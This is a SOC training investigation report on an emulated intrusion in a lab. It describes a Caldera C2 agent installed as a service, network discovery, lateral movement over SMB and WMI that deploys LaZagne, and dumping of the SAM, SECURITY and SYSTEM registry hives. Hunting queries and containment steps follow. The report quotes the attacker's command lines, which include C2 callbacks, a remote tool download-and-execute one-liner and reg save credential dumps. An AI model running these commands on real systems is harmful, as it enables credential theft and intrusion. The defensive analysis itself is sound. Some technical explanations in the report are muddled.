# 🔍 Alert Investigation Report

> **Platform:** SOC Simulation Project — WDLabs  
> **Environment:** Microsoft Defender for Endpoint / Microsoft Sentinel

---

## 📋 Case Details

| Field                 | Value                                                                                                                   |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| **Alert Name**        | Sensitive information theft activity via Security Account Manager                                                       |
| **Alert ID / Link**   | https://security.microsoft.com/alerts/dae33524b3-9dfd-4aef-9a3b-6548e3495e66_1?tid=567ea528-4e82-40fa-914e-38c05fd69677 |
| **Analyst**           | Carl Samson                                                                                                             |
| **Date Investigated** | 26/09/2026                                                                                                              |
| **Severity**          | `Critical` / `High` / ==`Medium`== / `Low`                                                                              |

---

## 1. Alert Summary

- **Host / Account affected:** socsim-srv02 SOCSIM\john.admin
- **Date & Time of alert:**   22/9/2026 17:34:21
- **What triggered the alert:**  The Security Account Manager (SAM) was used to access sensitive information.
- **Why it triggered (rule/logic):** Behavior rules

---

## 2. Investigation Findings

### What happened?
<!-- How was the activity executed or triggered? Walk through the technical detail. -->

The activity was triggered  on 31 Aug 2026 4:45:11, which wasn’t found on the alert timeline and process timeline period. This was the command line used to create a C2 connection server by the threat actor:

```
"wusvc.exe" -server http://172.31.2.203:8888 -group srv01
"wusvc.exe" -server http://172.31.2.203:8888 -group ws01
```

The C2 agent was running on both machines on srv01 server and ws01 as the workstation. 

31 Aug 13:27:48 is when SRV02 made connections on the C2 IP from a windows kernel called ``ntoskrnl.exe``, whcih is a filre sharing protcol called SMB. No agent detected on SRV02.

31 Aug 19:58:33,  device SRV01 used powershell.exe to connect the C2 server once. The C2 agent was installed in 2 seconds, downloadingwusvc.exe from the C2 server.

The following powershell script was executed:

```
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand dAByAHkA...
  → nssm.exe install CalderaAgent C:\Users\Public\wusvc.exe
  → nssm.exe set CalderaAgent AppParameters "-server http://172.31.2.203:8888 -group srv01"
  → nssm.exe set CalderaAgent AppStdoutCreationDisposition 2 / AppStderrCreationDisposition 2
  → nssm.exe set CalderaAgent AppRotateFiles 1 / AppRotateSeconds 86400 / AppRotateBytes 104858
  → nssm.exe get CalderaAgent Start
```

To translate whats happening from this command:
- A remote control was wrapped using Ansible's remote-exeuction wrapper. Then the attack sent theses comands to socsim-srv02. The attacker used theses commands to socsim-srv01 over the network as an administrator.
- The` nssm install CalderaAgent`  command makes the agent keep running on reboot by turning wusvc.exe into a Windows service. Which is automatically boots at the SYSTEMS  prviliege  level, which helps the attacker gain full control of the system. Then it is stored at `C:\Users\Public\` , which are common hiding places that any user can write to.
- The `set AppParameters` configs the server agent contacts and the groups it reports under.
- The agent stays undetected by the AppStdout, AppStderr and AppRotate by overwriting the agen'ts old log files and rotate them every 24 hours or every 100 KB of data. Which helps the agent run for weeks without alerting attention.
- Re-installing, not first infection. The agent was already running that morning at 04:45, so this was a re-install or reconfiguration.

On 31 Aug 19:58:37  to 25 Sep on deivce local-srv01 and ec2amaz-9oh9aqq, `wusvc.exe` was running and the agent connected the C2 server at 19:58:38. This show that the agent restarted at 04:45 and 16:45 every day on both machines and reconnected each time.

Next at 22 Sep 17:29 at 17:29:20 aa command was launched by `wusvc.exe` by running 
`cmd.exe /C arp -a & ipconfig /all & route print`. 

This was the attackers first running command through the agent and mapping the network around local-srv01. 

- `arp -a` lists the machines socsim-SRV01  that has recently talked to. This is how an attacker spots nearby targets such as socsim-SRV02 and c2amaz-9oh9aqq.
- `ipconfig /all` shows socsim-srv01's own IP address, subnet, DNS servers and domain like any`socsim.local` , so the attacker knows which network and domain they're in.
- `route print` shows which networks socsim-SRV01 can reach, so the attacker knows where they can move next.

Next the attacker performed a lateral movement from local-src01 to local-srv02 from 7:34:18 to 17:34:20. Which wasn't found on the alert timeline .

This was the following powershell commands where running:

```
powershell.exe -ExecutionPolicy Bypass -C "
 net use \\SOCSIM-SRV02\C$ "Password123!" /user:SOCSIM\john.admin;
 md \\SOCSIM-SRV02\C$\Windows\Temp\svcmon -f | Out-Null;
 (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe','\\SOCSIM-SRV02\C$\Windows\Temp\svcmon\svcmon.exe');
 $sec=ConvertTo-SecureString '**********' -AsPlainText -Force;
 $cred=New-Object System.Management.Automation.PSCredential('SOCSIM\john.admin',$sec);
 Invoke-WmiMethod -ComputerName SOCSIM-SRV02 -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ... svcmon.exe all > svcmon.log 2>&1'"
```

This single command carried out the whole move to SRV02 in about 2 seconds. In order, the attacker:

- `-ExecutionPolicy Bypass `turns off the PowerShell's safety rules that prevent it from being blocked. 
- Used `net use` and successfully logged in with the password `Password123! `that the attacker obtained the plain text password. 
- Created a folder on S`OCSIM-SRV02\C$\Windows\Temp\svcmon` to place the tool. Since temp files are rarely checked.
- Using `DownloadFile` from GitHub to install a tool called LaZagne, that goes straight onto socsim-srv02 system. LaZagne is a free, open sourced password-stealing tool. t was saved as `svcmon.exe` so it looks harmless and it never touched socsim-srv01's disk.
- Forcing the command `ConvertTo-SecureString` and `SCredential`to package john.admin login details. 
- Told socsim-SRV02 to run the tool `Invoke-WmiMethod ... Win32_Process Create`. WMI is a built in Windows remote-management feature, so the attacker could start a program on socsim-SRV02 without logging in to it interactively.

Then on 17:34:20 - socsim.srv02 began running rhe tool using `cmd.exe /c set TEMP=C:\Windows\Temp&&set TMP=C:\Windows\Temp&&C:\Windows\Temp\svcmon\svcmon.exe all > C:\Windows\Temp\svcmon\svcmon.log 2>&1` which sets the a temp older for LaZagne so it can unpack itself before running. A remote WMI session does not have a temp folder, which is used to make sure the attack worked.`svcmon.exe all`insures all admin tools turned on to steal every kind of password it can, which saves onto a log file called `svcmon.log` for later. 

On 17:34:21, the attack started opying the SAM hive using `[5944] cmd.exe  →  [2412] reg.exe save hklm\sam C:\Windows\Temp\nlurrk`.  The attacker used `reg.exe`, which is a windows registry tool, saved a full copy of the SAM hive and created a file called `nlurrk` in `C:\Windows\Temp`. The SAM holds password hases for every local accounts on srv02, including admin accounts. Attacks copy the files first because Windows locks the live SAM while its running, which is encrypted. So the attack use `reg save` to copy the ile and crack it offline. 

This alerted Defender by this command lines: _cmd.exe dumped credential info from registry using reg.exe · Source key HKEY_LOCAL_MACHINE\sam\ · Destination path nlurrk_

Then the attack performed another command `[5152] cmd.exe  →  [7104] reg.exe save hklm\security C:\Windows\Temp\fyxwdjwbpf` which steal the security hive that was saved onto a file called `fyxwdjwbpf`. The Security hive holds LSA secrets which has saved passwords on windows services and servers. It can also Cached domain credentials that can capture hahses of doman user's who login to socsim-srv02, This gives attackers access beyond one server and accounts that work across the domain. 
`
This alert defender as Defender logged it as: `cmd.exe dumped credential info from registry using reg.exe · Source key HKEY_LOCAL_MACHINE\security\ · Destination path fyxwdjwbpf`

Then lastly the attacker ran this command `[3500] cmd.exe  →  [1320] reg.exe save hklm\system C:\Windows\Temp\ejatqftik` to copy SYSTEM HIVE files that was saved as `ejatqftik`. The SYSTEM hive golds boot keys, encryption key that Windows uses to protect the SAM and Security Hives. The attack needed as without the boot key, the two files are unreadable and with it the attack can decrypt every hash key available. 

Which was alerted on Defender logged it as: _cmd.exe dumped credential info from registry using reg.exe · Source key HKEY_LOCAL_MACHINE\system\ · Destination path ejatqftik_ 

This means the attack left theses files are left on the temp directory:

```
- `C:\Windows\Temp\nlurrk`
- `C:\Windows\Temp\fyxwdjwbpf`
- `C:\Windows\Temp\ejatqftik`
```


### Evidence
<!-- What artefacts, log entries, or indicators support your conclusion? -->

```
// Paste key log entries, process trees, or notable findings here
```

Searching the activity of john.admin account activity - showing the commands, devices used, and programs executed and run. 
![[Pasted image 20260925213033.png]]


SAM Hive copied logs
```
22/9/2026 17:34:21 
 [5944] cmd.exe created [2412] reg.exe  save hklm\sam C:\Windows\Temp\nlurrk
Command line reg.exe  save hklm\sam C:\Windows\Temp\nlurrk
Process id 2412
Execution details Token elevation: Default, Integrity level: High
Image file path C:\Windows\System32\reg.exe
Image file SHA1 e65faa187d27d84106b78b909c06d405837ec64e
Mitre techniques T1003.002: Security Account Manager, T1012: Query Registry, T1552.002: Credentials in Registry, T1003: OS Credential Dumping
Initiating process cmd.exe
User SOCSIM\john.admin

22/9/2026 17:34:21 
 cmd.exe dumped credential info from registry using reg.exe
Source key HKEY_LOCAL_MACHINE\sam\
Destination path nlurrk
```

SECURITY hive copied logs
```
22/9/2026 17:34:21 
 [5152] cmd.exe created [7104] reg.exe  save hklm\security C:\Windows\Temp\fyxwdjwbpf
Command line reg.exe  save hklm\security C:\Windows\Temp\fyxwdjwbpf
Process id 7104
Execution details Token elevation: Default, Integrity level: High
Image file path C:\Windows\System32\reg.exe
Image file SHA1 e65faa187d27d84106b78b909c06d405837ec64e
Initiating process cmd.exe
User SOCSIM\john.admin

22/9/2026 17:34:21 
 cmd.exe dumped credential info from registry using reg.exe
Source key HKEY_LOCAL_MACHINE\security\
Destination path fyxwdjwbpf
```

SYSTEM hive copied
```
22/9/2026 17:34:21 
 [3500] cmd.exe created [1320] reg.exe  save hklm\system C:\Windows\Temp\ejatqftik
Command line reg.exe  save hklm\system C:\Windows\Temp\ejatqftik
Process id 1320
Execution details Token elevation: Default, Integrity level: High
Image file path C:\Windows\System32\reg.exe
Image file SHA1 e65faa187d27d84106b78b909c06d405837ec64e
Initiating process cmd.exe
User SOCSIM\john.admin

22/9/2026 17:34:21 
 cmd.exe dumped credential info from registry using reg.exe
Source key HKEY_LOCAL_MACHINE\system\
Destination path ejatqftik
```


C2 agent running on SRV01 and ws01 logs
```
DeviceName,FileName,ProcessCommandLine,FirstSeen
ec2amaz-9oh9aqq,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group ws01",31 Aug 2026 04:45:11
socsim-srv01.socsim.local,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",31 Aug 2026 04:45:11

Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName,AccountName
31 Aug 2026 04:45:11,nssm.exe,nssm.exe,services.exe,system
31 Aug 2026 04:45:11,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe,system
```

SRV02 connected to the C2 IP from ntoskrnl.exe

```
DeviceName,InitiatingProcessFileName,FirstSeen,LastSeen,Connections
socsim-srv02.socsim.local,ntoskrnl.exe,31 Aug 2026 13:27:48,31 Aug 2026 13:27:49,2
```

Performed SMB connection
![[Pasted image 20260926133719.png]]

PowerShell on SRV01 connected to the C2 server
```
`socsim-srv01.socsim.local,powershell.exe,31 Aug 2026 19:58:33,31 Aug 2026 19:58:33,1
```


Powershell downloaded wusvc.exe on KQL search
![[Pasted image 20260926134305.png]]

Virus total shows the wusvc.exe files hashes came out as flagged.
![[Pasted image 20260926134124.png]]

Ansible and NSSM installed the CalderaAgent service

```
Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName,AccountName
31 Aug 2026 19:58:35,nssm.exe,nssm.exe install CalderaAgent C:\Users\Public\wusvc.exe,powershell.exe,administrator
31 Aug 2026 19:58:35,nssm.exe,"nssm.exe set CalderaAgent AppParameters ""-server http://172.31.2.203:8888 -group srv01""",powershell.exe,administrator
31 Aug 2026 19:58:35,nssm.exe,nssm.exe set CalderaAgent AppStdoutCreationDisposition 2,powershell.exe,administrator
31 Aug 2026 19:58:35,nssm.exe,nssm.exe set CalderaAgent AppStderrCreationDisposition 2,powershell.exe,administrator
31 Aug 2026 19:58:35,nssm.exe,nssm.exe set CalderaAgent AppRotateFiles 1,powershell.exe,administrator
31 Aug 2026 19:58:35,nssm.exe,nssm.exe set CalderaAgent AppRotateSeconds 86400,powershell.exe,administrator
31 Aug 2026 19:58:35,nssm.exe,nssm.exe set CalderaAgent AppRotateBytes 104858,powershell.exe,administrator
31 Aug 2026 19:58:35,nssm.exe,nssm.exe get CalderaAgent Start,powershell.exe,administrator
```


Decocded parent commands on Ansible

```
Encoded: "powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand dAByAHkAIAB7ACAAWwBDAG8A...

Decoded (UTF-16LE):
try { [Console]::InputEncoding = [Console]::OutputEncoding = New-Object System.Text.UTF8Encoding } catch { $null = $_ }
if ($PSVersionTable.PSVersion -lt [Version]"3.0") {
'{"failed":true,"msg":"Ansible requires PowerShell v3.0 or newer"}'
exit 1
}
```

The  IP address that loggged onto administrator 
![[Pasted image 20260927125548.png]]

The agent was re-installed

```
31 Aug 2026 04:45:11,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe,system
31 Aug 2026 19:58:35,nssm.exe,nssm.exe install CalderaAgent C:\Users\Public\wusvc.exe,powershell.exe,administrator
```


The agent restarted at 04:45 and 16:45 daily and reconnected

```
31 Aug 2026 19:58:37,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe,system
22 Sep 2026 04:45:11,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe,system
22 Sep 2026 16:45:11,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe,system
25 Sep 2026 16:45:11,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe,system
```

```
socsim-srv01.socsim.local,wusvc.exe,31 Aug 2026 19:58:38,25 Sep 2026 04:45:12,18
ec2amaz-9oh9aqq,wusvc.exe,31 Aug 2026 16:45:12,25 Sep 2026 16:45:12,20
```

Network discovery through the agent

```
Timestamp,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName
22 Sep 2026 17:29:20,cmd.exe,cmd.exe /C arp -a & ipconfig /all & route print,wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe
22 Sep 2026 17:29:20,ARP.EXE,arp  -a ,cmd.exe,cmd.exe /C arp -a & ipconfig /all & route print,wusvc.exe
22 Sep 2026 17:29:20,ipconfig.exe,ipconfig  /all ,cmd.exe,cmd.exe /C arp -a & ipconfig /all & route print,wusvc.exe
22 Sep 2026 17:29:20,ROUTE.EXE,route  print,cmd.exe,cmd.exe /C arp -a & ipconfig /all & route print,wusvc.exe
```

Lateral movement from SRV01 to SRV02

```
22 Sep 2026 17:34:18,powershell.exe,"powershell.exe -ExecutionPolicy Bypass -C ""net use \\SOCSIM-SRV02\C$ \""Password123!\"" /user:SOCSIM\john.admin; md \\SOCSIM-SRV02\C$\Windows\Temp\svcmon -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe','\\SOCSIM-SRV02\C$\Windows\Temp\svcmon\svcmon.exe'); $sec=ConvertTo-SecureString '**********' -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential('SOCSIM\john.admin',$sec); Invoke-WmiMethod -ComputerName SOCSIM-SRV02 -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c set TEMP=C:\Windows\Temp&&set TMP=C:\Windows\Temp&&C:\Windows\Temp\svcmon\svcmon.exe all > C:\Windows\Temp\svcmon\svcmon.log 2>&1'""",wusvc.exe,"""wusvc.exe"" -server http://172.31.2.203:8888 -group srv01",nssm.exe
22 Sep 2026 17:34:19,net.exe,"""net.exe"" use \\SOCSIM-SRV02\C$ ********** /user:SOCSIM\john.admin",powershell.exe,...,wusvc.exe
```


Alert timeline for Sensitive information theft activity via Security Account Manager.

![[Pasted image 20260927130226.png]]


The remote IP address when the attacker downloaded the GitHub file
![[Pasted image 20260927131131.png]]


SRV02 ran the tool through WMI
```
22/9/2026 17:34:20 
 [5536] WmiPrvSE.exe -secured -Embedding
User NT AUTHORITY\NETWORK SERVICE

22/9/2026 17:34:20 
 [4040] cmd.exe /c set TEMP=C:\Windows\Temp&&set TMP=C:\Windows\Temp&&C:\Windows\Temp\svcmon\svcmon.exe all > C:\Windows\Temp\svcmon\svcmon.log 2>&1
Execution details Token elevation: Default, Integrity level: High
User SOCSIM\john.admin

22/9/2026 17:34:20 
 cmd.exe process was created from a remote machine 'SOCSIM-SRV01' using Windows Management Instrumentation (WMI)
Execution source Remote
Remote machine FQDN SOCSIM-SRV01.socsim.local
Suspicious command launched from a remote location New Detected Medium
Suspicious WMI activity initiated remotely New Detected Medium
```

Stored files nlurrk, fyxwdjwbpf abd ejatqftik on the temo directory 
![[Pasted image 20260927135014.png]]
### Was the activit\y successful?
- [x] Yes
- [ ] No
- [ ] Unknown

### Verdict
- [x] **Malicious**
- [ ] **Non-malicious**
- [ ] **Suspicious — requires further investigation**

**Justification:**
<!-- Why did you reach this conclusion? Be specific. -->

This is an example of a C2 command control attack that demonstrated lateral movement, network discovery persistence, and credential dumping based on the tools used to steal the file, decrypt it to get the plain passwords, and store temp files from the malicious tool from LaZagne downloaded from GitHub.

Device

This is a true positive as an attack of a  hands-on-keyboard intrusion in which the attacker stole credentials and moved laterally between servers.

The following MITRE ATT&CK techniques were used by the APT:

- T1543.003 Windows Service (persistence)
- T1071.001 Application Layer Protocol (C2)
- T1016 System Network Configuration Discovery
- T1078.002 Valid Accounts: Domain Accounts
- T1021.002 SMB/Windows Admin Shares
- T1570 Lateral Tool Transfer
- T1047 Windows Management Instrumentation
- T1003.002 OS Credential Dumping: SAM
- T1003.001 OS Credential Dumping: LSASS Memory

A MITRE Caldera C2 agent ran as the `CalderaAgent` service on SOCSIM-SRV01 and was also active on ec2amaz-9oh9aqq, beaconing to `172.31.2.203:8888` from 31 Aug to 25 Sep. On 22 Sep, the agent on SRV01 mapped the network. It then used john.admin's plain text password to copy LaZagne onto SOCSIM-SRV02 as `svcmon.exe` and run it remotely through WMI. LaZagne dumped the SAM, SECURITY and SYSTEM hives and read LSASS memory. Defender detected LaZagne but didn't block it, and the activity on SRV01 raised no alerts, so it was found only through threat hunting.

---

## 3. Investigation Steps

<!-- Walk through your process in order. What did you look at first? What led you to each pivot? -->

1. Went through the process and alert timeline on window defender 
2. performing KQL commands 10 mins before and after the event: Device activity, account activity, integrity hash verification, IP address, any C2 connections, and affected files.  
3. Using Virus Total to verify files that have been infected.

### Queries Used

```kql
// Paste queries here

DeviceProcessEvents

| where Timestamp between (datetime(2026-09-22 07:24:21) .. datetime(2026-09-22 07:44:21))
| where AccountName =~ "john.admin"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc

DeviceLogonEvents
| where DeviceName startswith "socsim-srv01"
| where Timestamp between (datetime(2026-08-30 14:00:00) .. datetime(2026-08-31 14:00:00))
| where AccountName =~ "administrator"
| where isnotempty(RemoteIP)
| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Logons = count() by RemoteIP, RemoteDeviceName, LogonType, ActionType
| order by FirstSeen asc


DeviceProcessEvents
| where Timestamp between (datetime(2026-09-22 07:24:21) .. datetime(2026-09-22 07:44:21))
| where DeviceName =~ "socsim-srv02.socsim.local"
| project Timestamp, DeviceName , AccountName, FileName, FolderPath, ProcessCommandLine, MD5, SHA256, FileSize, Type

DeviceProcessEvents
| where DeviceName startswith "socsim-srv01"
| where Timestamp between (datetime(2026-09-22 07:00:00) .. datetime(2026-09-22 07:35:00))
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
	| order by Timestamp asc
	
union DeviceNetworkEvents, DeviceFileEvents
| where DeviceName startswith "socsim-srv01"
| where Timestamp between (datetime(2026-08-31 09:58:00) .. datetime(2026-08-31 09:59:00))
| where RemoteIP == "172.31.2.203" or FileName =~ "wusvc.exe"
| project Timestamp, Type, ActionType, RemoteIP, RemotePort, RemoteUrl, FileName, FolderPath, SHA256, InitiatingProcessFileName



| project Timestamp, Type, ActionType, RemoteIP, RemotePort, RemoteUrl, FileName, FolderPath, SHA256, InitiatingProcessFileName
	
	union DeviceNetworkEvents, DeviceFileEvents
| where DeviceName startswith "socsim-srv01"
| where Timestamp between (datetime(2026-08-31 09:58:00) .. datetime(2026-08-31 09:59:00))
| where RemoteIP == "172.31.2.203" or FileName =~ "wusvc.exe"
	
	
DeviceProcessEvents
| where DeviceName startswith "socsim-srv01"
| where FileName in~ ("wusvc.exe", "nssm.exe") or ProcessCommandLine has_any ("wusvc", "nssm")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc

DeviceNetworkEvents
| where RemoteIP == "172.31.2.203"
| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Connections = count() by DeviceName, InitiatingProcessFileName

DeviceProcessEvents
| where FileName =~ "wusvc.exe" or ProcessCommandLine has "172.31.2.203"
| summarize FirstSeen = min(Timestamp) by DeviceName, FileName, ProcessCommandLine


DeviceNetworkEvents
| where DeviceName startswith "socsim-srv02"
| where RemoteIP == "172.31.2.203"
| project Timestamp, ActionType, RemoteIP, RemotePort, LocalPort, Protocol, InitiatingProcessFileName

search in (DeviceFileEvents, DeviceProcessEvents, DeviceEvents, DeviceRegistryEvents, AlertEvidence)
    Timestamp > datetime(2026-09-22 07:30:00)
    and ("nlurrk" or "fyxwdjwbpf" or "ejatqftik")
| extend TargetFile = extract(@"(nlurrk|fyxwdjwbpf|ejatqftik)", 1, tostring(pack_all()))
| distinct TargetFile, $table, ActionType

```

---

## 4. Categorisation

- [x] ✅ **True Positive** — malicious activity confirmed
- [ ] ⚠️ **Benign True Positive** — alert fired correctly, activity is legitimate
- [ ] ❌ **False Positive** — alert fired incorrectly, rule needs review

---

## 5. Recommended Actions

**Escalation:**
- [x] Urgent — phone call required
- [ ] Non-urgent — email sufficient
- [ ] No escalation required

**Containment / Next Steps:**
<!-- What should happen next? Free text — don't limit yourself to a checklist. -->

- Remove temp files and prevent tools from storing temp files. Use live response to remove the three temp files and use APPLocker or WDAC to block programs from running `C:\Windows\Temp `and `C:\Users\Public.`
- Block lateral movement - Use Windows Firewall to restrict SMB, WMI and WinRM between servers and block their internet access. Then turn on EDR in block mode and the ASR rule that blocks WMI process creation.
- Isolate the devices. In Microsoft Defender for Endpoint, collect an investigation package, then choose Isolate device for SOCSIM-SRV01, ec2amaz-9oh9aqq and SOCSIM-SRV02.
- Reset all stolen credential passwords as soon as possible.

**Alert Tuning:**
- [x] Tune recommended —
- [ ] No tuning required

---

## 6. Lessons Learned

<!-- What would you do differently? Where did you go wrong or take a longer path than needed?
     This is the most valuable part of the write-up for your own growth and for anyone reading your portfolio. -->

- Understanding how C2 Command Control attacks work, but researching the meaning and seeing the actual picture in my threat hunting analysis.
- Start to replay on advanced threat hunting without relying too much on the windows defender alert 
- Learning about the Security Account Manager (SAM), including that the SAM database cannot be directly accessed while Windows is running because it is locked by the operating system.
- Still need to improve in shorten down the log noise
- Overwhelmingly provided information got me confused to put together a timeline, which requires practice and patience and reps over time. 

---

<details>
<summary>📚 About this template</summary>

This investigation template is from the **[SOC Simulation Project](https://www.skool.com/socsim/about)** by WDLabs / WebDefend Cyber Security — a hands-on training environment giving aspiring analysts access to Microsoft Defender for Endpoint and Microsoft Sentinel to investigate real alerts generated by emulated threat actor TTPs.

</details>
